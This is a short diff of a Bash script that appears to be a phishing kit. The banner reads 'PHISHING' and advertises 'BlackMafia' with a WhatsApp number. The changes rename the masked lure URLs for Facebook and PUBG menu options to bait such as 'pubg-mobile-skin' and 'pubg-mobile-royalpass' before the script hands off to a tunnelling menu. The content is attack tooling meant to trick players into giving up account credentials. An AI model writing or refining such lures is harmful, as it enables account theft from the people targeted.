@@ -74,7 +74,7 @@ ${ORANGE} ███████████████████████�
 ${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}BlackMafia ${ORANGE}█
 ${ORANGE} █ ${RED}|__] |__| | [__  |__| | |\ | | __ ${MAGENTA}WhatsApp   ${ORANGE}█
 ${ORANGE} █ ${RED}|    |  | | ___] |  | | | \| |__] ${MAGENTA}03094161457${ORANGE}█
-${ORANGE} █                                               ${ORANGE}█
+${ORANGE} █                                              ${ORANGE}█
 ${ORANGE} ████████████████████████████████████████████████
 	EOF
 }
@@ -306,15 +306,15 @@ ${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
-		mafia404='http://pubg-mobile'
+		mafia404='http://pubg-mobile-skin'
 		tunnel_menu
         elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 	        website="Pubg"
-		mafia404='http://pubg-mobile'
+		mafia404='http://pubg-mobile-royalpass'
 		tunnel_menu
         elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 	        website="Testing"
-		mafia404='http://pubg-mobile'
+		mafia404='http://pubg-mobile-glacier'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
